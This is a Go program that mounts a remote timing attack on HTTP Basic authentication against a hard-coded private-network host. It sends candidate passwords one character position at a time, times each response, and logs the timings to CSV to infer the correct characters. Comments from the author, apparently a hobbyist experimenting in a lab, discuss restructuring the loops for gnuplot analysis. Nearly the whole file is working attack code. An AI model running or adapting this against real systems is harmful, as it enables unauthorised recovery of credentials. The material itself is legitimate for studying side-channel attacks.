// READ: http://rdist.root.org/2010/07/19/exploiting-remote-timing-attacks/

package main

import(
	"encoding/base64"
	"log"
	"net"
	"bytes"
	"time"
	"fmt"
	"os"
	"io"
	"bufio"
	"encoding/csv"
	"strconv"
)

var(
	keyspace = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	password = []rune("!!!!!!!!!!!!!!!!") // 16 garantueed wrong bytes
	cw *csv.Writer
	dw *io.Writer
	skeletonRequest string
	encoder io.WriteCloser
	buffer *bytes.Buffer
	host string
)

const(
	debug = true
	target = "192.168.1.6"
	port = 20004
	iterations = 101
)

func check(err error, where string) {
	if err != nil {
		log.Printf("ERROR in %s",where)
		log.Fatal(err)
	}
}

func writeEntry(delta int64, char rune, pos int) {
	i := fmt.Sprintf("%d", delta)
	err := cw.Write([]string{i, string(char), strconv.Itoa(pos)})
	check(err, "[writeEntry] - cw.Write")
	cw.Flush()
}

func sendRequest(candidate []rune) (delta time.Duration)  {
	// empty existing buffer
	buffer.Reset()
	encoder.Write([]byte("DoesNotMatter:"+string(candidate)))
	body := fmt.Sprintf(skeletonRequest, buffer.String())
	blen := len(body)
	// Operator, connect me to target.. Yes, I'll hold
	conn, err  := net.Dial("tcp", host)
	check(err, "sendRequest, Dial"); defer conn.Close()
	
	// we want to send everything but the last byte, start the
	// timer, and "stop" the timer when we get back a response
	time.Sleep(500*time.Microsecond) // was 500
	fmt.Fprint(conn, body[:blen-2])
	pre := time.Now()
	fmt.Fprint(conn, body[blen-1])
	bufio.NewReader(conn).ReadByte()
	return time.Since(pre)
}

func init() {
	host = target + ":" + fmt.Sprintf("%d", port)
	buffer = bytes.NewBuffer(make([]byte, 512))
	encoder = base64.NewEncoder(base64.StdEncoding, buffer)
	cw = csv.NewWriter(os.Stdout)
	skeletonRequest = "GET / HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic %s\r\n\r\n"	
}

func main() {
	// For the sake of completeness or whatever.

	// The problem I'm facing, or the thing I perceive as a
	// problem as of right know (Sun Aug 21 11:32:37 CEST 2016),
	// is that the dataset I'm producing down below is messy in
	// terms of its sorting.  Messy in the sense that, each
	// iteration spans len(password) * len(keyspace), and only
	// after does the next iteration start.
	//
	// This (backwards way of structuring things) makes processing
	// the data in something like gnuplot tedious, where I first
	// have to actually script up to only fetch data x from point
	// y, increment by z and fetch the next datapoint
	//
	// That is because, I am interested in the median of a
	// particular character in the keyspace relative to the
	// position it's being tried in, and my dataset should be
	// collected accordingly.
	// 
	// As of now (again Sun Aug 21 11:32:37 CEST 2016), I propose
	// to change the looping structure from:
	//
	//  for i in range iterations
	//    for y in range len(password)
	//      for ki in range keyspace
	// 
	// To the following:
	//
	//  for y in range len(password)
	//    for ki in range keyspace
	//      for i in range iterations
	//
	// This would allow me to quite easily, in gnuplot
	// simply plot the first n (number of iterations)
	// datapoints, and rejoice accordingly.
	// hopefully this works better.
	//
	// Note that since we're determining wheter or not to send
	// a known false request if ki % 2 == 0, this should also
	// be changed to i % 2 == 0; as the top iterator is over
	// iterations, rather than keyspace.
	//
	// Update: Sun Aug 21 12:45:31 CEST 2016
	//  Initial testing seems to bproduce much more clear data, Now
	// There's only one thing left to add. Gnuplot supports 'indexing'
	// datasets by shoving a comment into a csv-file in order to delimit them
	// using this, we can without having to struggle with increasing
	// the ranges over which we plot, simply refer to a index.
	// Note: Docs on index-functionality can be found on page 87 in gnuplot
	// docs (http://gnuplot.info/docs_5.0/gnuplot.pdf)
	
	for y := 0; y < len(password); y++ {
		fmt.Fprintf(os.Stderr, "\n========== Index %d/%d ==========\n", y, len(password));
		//cw.Write([]string{fmt.Sprintf("# index_%d", y),})
		for ki := range(keyspace) {
			fmt.Fprintf(os.Stderr, "%c", keyspace[ki])
			for i := 0; i < iterations; i++ {
				p := make([]rune, 16)
				copy(p, password)
				p[y] = keyspace[ki]
				if i % 2 == 0 {
					delta := sendRequest(p)
					writeEntry(delta.Nanoseconds(), p[y], y)
				} else {
					delta := sendRequest(password)
					writeEntry(delta.Nanoseconds(), password[0], y)
				}
			}
		}
	}
	fmt.Printf("\n");
}
